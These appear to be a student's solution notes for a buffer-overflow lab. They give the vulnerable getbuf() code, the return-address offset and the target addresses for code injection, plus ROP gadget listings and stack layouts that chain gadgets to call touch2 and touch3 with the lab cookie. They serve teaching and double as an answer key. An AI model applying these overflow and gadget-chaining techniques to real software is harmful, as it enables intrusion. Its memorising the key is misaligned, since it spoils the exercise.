unsigned getbuf() {
    char buf[BUFFER_SIZE];
    Gets(buf);
    return 1;
}

*********
* Part I
*********

#### Level 1
void test() {
    int val;
    val = getbuf();
    printf("No exploit. Getbuf returned 0x%x\n", val);
}


address of return value - address of BUF = 0x28
the address of TOUCH1:  0x4017c0


#### Level 2
void touch2(unsigned val) {
    vlevel = 2; /* Part of validation protocol */
    if (val == cookie) {
        printf("Touch2!: You called touch2(0x%.8x)\n", val);
        validate(2);
    } else {
        printf("Misfire: You called touch2(0x%.8x)\n", val);
        fail(2);
    }
    exit(0);
}


the address of BUF:     0x5561dc78
the address of TOUCH2:  0x4017ec


#### Level 3
void touch3(char *sval) {
    vlevel = 3; /* Part of validation protocol */
    if (hexmatch(cookie, sval)) {
        printf("Touch3!: You called touch3(\"%s\")\n", sval);
        validate(3);
    } else {
        printf("Misfire: You called touch3(\"%s\")\n", sval);
        fail(3);
    }
    exit(0);
}

/* Compare string to hex represention of unsigned value */
int hexmatch(unsigned val, char *sval) {
    char cbuf[110];
    /* Make position of check string unpredictable */
    char *s = cbuf + random() % 100;
    sprintf(s, "%.8x", val);
    return strncmp(sval, s, 9) == 0;
}


the address of BUF:     0x5561dc78
the address of TOUCH3:  0x4018fa



**********
* Part II
**********

#### Level 2
/* gadget 1 */
0x00000000004019ab <addval_219+4>:   pop    %rax
0x00000000004019ac <addval_219+5>:   nop
0x00000000004019ad <addval_219+6>:   retq

/* gadget 2 */
0x00000000004019a3 <addval_273+3>:   mov    %eax,%edi
0x00000000004019a5 <addval_273+5>:   retq


/* stack */
0x00000000004019ab      /* gadget 1 */
0x59b997fa              /* cookie   */
0x00000000004019a3      /* gadget 2 */
0x4017ec                /* touch2   */


#### Level 3
/* gadget 1 */
0x00000000004019ab <addval_219+4>:   pop    %rax
0x00000000004019ac <addval_219+5>:   nop
0x00000000004019ad <addval_219+6>:   retq

/* gadget 2 */
0x0000000000401a42 <addval_487+2>:   mov    %eax,%edx
0x0000000000401a44 <addval_487+4>:   test   %al,%al
0x0000000000401a46 <addval_487+6>:   retq

/* gadget 3 */
0x0000000000401a34 <getval_159+1>:   mov    %edx,%ecx
0x0000000000401a36 <getval_159+3>:   cmp    %cl,%cl
0x0000000000401a38 <getval_159+5>:   retq

/* gadget 4 */
0x0000000000401a13 <addval_436+2>:   mov    %ecx,%esi
0x0000000000401a15 <addval_436+4>:   nop
0x0000000000401a16 <addval_436+5>:   nop
0x0000000000401a17 <addval_436+6>:   retq

/* gadget 5 */
0x0000000000401a06 <addval_190+3>:   mov    %rsp,%rax
0x0000000000401a09 <addval_190+6>:   retq

/* gadget 6 */
0x00000000004019c5 <setval_426+2>:   mov    %rax,%rdi
0x00000000004019c8 <setval_426+5>:   nop
0x00000000004019c9 <setval_426+6>:   retq

/* gadget 7 */
0x00000000004019d6 <+0>:     lea    (%rdi,%rsi,1),%rax
0x00000000004019da <+4>:     retq

/* gadget 8 */
0x00000000004019c5 <setval_426+2>:   mov    %rax,%rdi
0x00000000004019c8 <setval_426+5>:   nop
0x00000000004019c9 <setval_426+6>:   retq


/* stack */
0x00000000004019ab      /* gadget 1 */
0x20                    /* distence */      distence %rsp will add with
0x0000000000401a42      /* gadget 2 */
0x0000000000401a34      /* gadget 3 */
0x0000000000401a13      /* gadget 4 */
0x0000000000401a06      /* gadget 5 */
0x00000000004019c5      /* gadget 6 */
0x00000000004019d6      /* gadget 7 */
0x00000000004019c5      /* gadget 8 */
0x4018fa                /* touch3   */
0x6166373939623935      /* cookie   */